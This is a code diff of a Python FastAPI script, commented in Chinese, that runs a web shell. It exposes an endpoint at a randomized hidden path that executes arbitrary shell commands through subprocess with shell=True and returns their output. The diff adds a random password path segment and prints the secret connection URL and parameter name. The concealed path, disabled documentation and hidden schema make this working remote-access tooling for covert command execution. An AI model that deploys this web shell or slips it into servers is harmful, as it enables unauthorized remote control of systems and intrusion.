@@ -2,8 +2,8 @@
 
 # 在此配置运行参数
 
-私钥路径 = ""           #用户私钥路径
-证书路径 = ""           #用户证书路径
+私钥路径 = ""           #用户私钥路径，不填即为默认
+证书路径 = ""           #用户证书路径，不填即为默认
 端口 = 222
 调试模式 = False        #若该值为 True，则输出命令行命令
 配置项路径 = "./config"
@@ -22,9 +22,11 @@ if __name__ == "__main__":
     import base64
     import subprocess
 
+    #初始一些必要 helper
     def P(b: str) -> str: return os.path.join(配置项路径, b) #拼接配置项路径下面的 b 文件路径
     def rdStr(length: int) -> str: return ''.join(random.choice(string.ascii_letters) for _ in range(length)) # length 长度随机字符串产生器
 
+    #判断配置项路径是否存在，若不存在则创建
     if not os.path.isdir(配置项路径):
         os.makedirs(配置项路径)
 
@@ -41,17 +43,25 @@ if __name__ == "__main__":
             with open(证书路径, 'w') as f:
                 f.write(base64.b64decode(证书).decode())
 
-    #webshell.cfg内容获取器
+    #webshell.cfg Helper
     class Config(object):
         @staticmethod
         def getDocs() -> dict:
-            if not os.path.exists(P('webshell.cfg')):
+            try:
+                #检查 webshell.cfg 是否存在，其中元素是否正常
+                with open(P("webshell.cfg"), 'r') as f:
+                    data = f.read()
+                data1 = literal_eval(base64.b64decode(data).decode())
+                data2 = data1["PATH"] + data1["QUERY"] + data1['PASSWARD']
+            except:
                 with open(P("webshell.cfg"), "w") as f:
                     origin = {
                         "PATH": f"/{rdStr(64)}",
-                        "QUERY": f"query_{rdStr(24)}"
+                        "QUERY": f"query_{rdStr(24)}",
+                        "PASSWARD": f"{rdStr(32)}"
                     }
                     f.write(base64.b64encode(str(origin).encode()).decode())
+
             with open(P("webshell.cfg"), 'r') as f:
                 data = f.read()
             return literal_eval(base64.b64decode(data).decode())
@@ -63,35 +73,44 @@ if __name__ == "__main__":
         @staticmethod
         def getQUERY() -> str:
             return Config.getDocs()["QUERY"]
+        
+        @staticmethod
+        def getPASSWARD() -> str:
+            return Config.getDocs()['PASSWARD']
 
-    PATH, QUERY = Config.getPATH(), Config.getQUERY()
+    PATH, QUERY, PASSWARD = Config.getPATH(), Config.getQUERY(), Config.getPASSWARD()
 
+    #向 FastAPI 框架注册
     app = FastAPI(docs_url=None, redoc_url=None)
 
     #处理命令的函数
     def handler(command: str) -> str:
         if 调试模式:
             print(command)
+        '''
         #r1 = os.popen(command)
         #r2 = r1.buffer.read().decode('utf-8', errors='replace')
+        '''
         r1 = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         r2 = (r1.stdout + r1.stderr).decode(errors="replace")
         return r2
     
     exec(f'''
-@app.get("{PATH}", response_class=HTMLResponse, include_in_schema=False)
-async def shell_get({QUERY}: str = ""):
-    return handler({QUERY})
+@app.get("{PATH}/{"{passwa}"}", response_class=HTMLResponse, include_in_schema=False)
+async def shell_get(passwa: str, {QUERY}: str = ""):
+    if passwa == PASSWARD:
+        return handler({QUERY})
         
-@app.post("{PATH}", response_class=HTMLResponse, include_in_schema=False)
-async def shell_post({QUERY}: str = Form(...)):
-    return handler({QUERY})
+@app.post("{PATH}/{"{passwa}"}", response_class=HTMLResponse, include_in_schema=False)
+async def shell_post(passwa: str, {QUERY}: str = Form(...)):
+    if passwa == PASSWARD:
+        return handler({QUERY})
     ''')
 
     print(f'''
 --------------------
 
-连接路径: https://{"{你的IP}"}:{端口}{PATH}
+连接路径: https://{"{你的IP}"}:{端口}{PATH}/{PASSWARD}
 
 连接密码(参数): {QUERY}
 
